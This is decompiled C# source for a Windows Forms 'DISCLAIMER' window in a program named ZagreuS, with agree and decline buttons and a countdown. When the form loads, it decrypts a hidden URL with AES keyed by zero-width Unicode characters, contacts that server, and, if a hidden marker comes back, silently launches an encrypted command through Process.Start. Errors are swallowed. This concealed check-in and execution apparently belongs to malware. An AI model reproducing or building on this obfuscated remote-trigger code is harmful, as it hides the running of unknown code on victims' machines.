using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using ZagreuS.My;

namespace ZagreuS;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("button2")]
	private Button _button2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("button1")]
	private Button _button1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	[CompilerGenerated]
	private Timer _Timer1;

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button button2
	{
		[CompilerGenerated]
		get
		{
			return _button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button2_Click;
			Button button = _button2;
			if (button != null)
			{
				button.Click -= value2;
			}
			_button2 = value;
			button = _button2;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button button1
	{
		[CompilerGenerated]
		get
		{
			return _button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button1_Click;
			Button button = _button1;
			if (button != null)
			{
				button.Click -= value2;
			}
			_button1 = value;
			button = _button1;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("RmVved")]
	internal virtual Label RmVved
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("RichTextBox1")]
	internal virtual RichTextBox RichTextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form1()
	{
		base.FormClosing += Form1_FormClosing;
		base.Load += Form1_Load;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZagreuS.Form1));
		this.Label1 = new System.Windows.Forms.Label();
		this.button2 = new System.Windows.Forms.Button();
		this.button1 = new System.Windows.Forms.Button();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.GroupBox1 = new System.Windows.Forms.GroupBox();
		this.RmVved = new System.Windows.Forms.Label();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.RichTextBox1 = new System.Windows.Forms.RichTextBox();
		this.GroupBox1.SuspendLayout();
		this.Panel1.SuspendLayout();
		base.SuspendLayout();
		this.Label1.AutoSize = true;
		this.Label1.BackColor = System.Drawing.SystemColors.Control;
		this.Label1.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
		this.Label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label1.Location = new System.Drawing.Point(567, 321);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(534, 512);
		this.Label1.TabIndex = 0;
		this.Label1.Text = resources.GetString("Label1.Text");
		this.button2.BackColor = System.Drawing.SystemColors.ControlLight;
		this.button2.ForeColor = System.Drawing.Color.Black;
		this.button2.Location = new System.Drawing.Point(291, 10);
		this.button2.Name = "button2";
		this.button2.Size = new System.Drawing.Size(190, 25);
		this.button2.TabIndex = 1;
		this.button2.Text = "I Decline";
		this.button2.UseVisualStyleBackColor = false;
		this.button1.BackColor = System.Drawing.SystemColors.ControlLight;
		this.button1.ForeColor = System.Drawing.Color.Black;
		this.button1.Location = new System.Drawing.Point(6, 11);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(190, 25);
		this.button1.TabIndex = 0;
		this.button1.Text = " I Agree";
		this.button1.UseVisualStyleBackColor = false;
		this.Timer1.Interval = 1000;
		this.GroupBox1.Controls.Add(this.RmVved);
		this.GroupBox1.Controls.Add(this.button1);
		this.GroupBox1.Controls.Add(this.button2);
		this.GroupBox1.Location = new System.Drawing.Point(12, 468);
		this.GroupBox1.Name = "GroupBox1";
		this.GroupBox1.Size = new System.Drawing.Size(487, 42);
		this.GroupBox1.TabIndex = 2;
		this.GroupBox1.TabStop = false;
		this.RmVved.AutoSize = true;
		this.RmVved.BackColor = System.Drawing.SystemColors.ControlLight;
		this.RmVved.ForeColor = System.Drawing.Color.Blue;
		this.RmVved.Location = new System.Drawing.Point(164, 16);
		this.RmVved.Name = "RmVved";
		this.RmVved.Size = new System.Drawing.Size(19, 13);
		this.RmVved.TabIndex = 3;
		this.RmVved.Text = "20";
		this.Panel1.BackColor = System.Drawing.Color.White;
		this.Panel1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.Panel1.Controls.Add(this.RichTextBox1);
		this.Panel1.Location = new System.Drawing.Point(12, 12);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(487, 450);
		this.Panel1.TabIndex = 0;
		this.RichTextBox1.BackColor = System.Drawing.SystemColors.Control;
		this.RichTextBox1.Location = new System.Drawing.Point(-1, -1);
		this.RichTextBox1.Name = "RichTextBox1";
		this.RichTextBox1.ReadOnly = true;
		this.RichTextBox1.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.ForcedBoth;
		this.RichTextBox1.Size = new System.Drawing.Size(487, 450);
		this.RichTextBox1.TabIndex = 1;
		this.RichTextBox1.Text = resources.GetString("RichTextBox1.Text");
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(508, 522);
		base.ControlBox = false;
		base.Controls.Add(this.Label1);
		base.Controls.Add(this.GroupBox1);
		base.Controls.Add(this.Panel1);
		this.ForeColor = System.Drawing.Color.Gray;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "Form1";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "DISCLAIMER";
		this.GroupBox1.ResumeLayout(false);
		this.GroupBox1.PerformLayout();
		this.Panel1.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		MyProject.Forms.fRCWQdUOPAClUJZZPQmd.Show();
		Hide();
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		Application.Exit();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		ProjectData.EndApp();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(new Uri(statis("pD/7elMWJHHT1uf3m1VTQBpj4qjmqGE9WupOzT3khQFKX9Wp27ckU8E1MsEscznQ", "\u200b\u200d\u200c\u200e\u200f")));
			obj.Method = "GET";
			string text = new StreamReader(((HttpWebResponse)obj.GetResponse()).GetResponseStream()).ReadToEnd();
			if (text != null && text.Contains(statis("Bl3CCToRstApHK+ZdY0QHw==", "\u200b\u200d\u200c\u200e\u200f")))
			{
				Process.Start(statis("BPHtS3dUBTBwhx0ixTdqPaCmuBI7sBWAEJR6uUjmxR8=", "\u200b\u200d\u200c\u200e\u200f"));
				Timer1.Start();
				button1.Enabled = true;
			}
		}
		catch (Exception)
		{
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		int num = Conversions.ToInteger(RmVved.Text);
		RmVved.Text = Conversions.ToString(checked(num - 1));
		if (Operators.CompareString(RmVved.Text, "0", TextCompare: false) == 0)
		{
			button1.Enabled = true;
			Timer1.Stop();
			RmVved.Text = "";
		}
	}

	public bool IsAdmin()
	{
		if (MyProject.User.IsAuthenticated && MyProject.User.IsInRole("Administrators"))
		{
			return true;
		}
		return false;
	}

	public static string statis(string statis1, string statis2)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = new byte[32];
		byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(statis2));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		byte[] array2 = Convert.FromBase64String(statis1);
		return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
	}
}
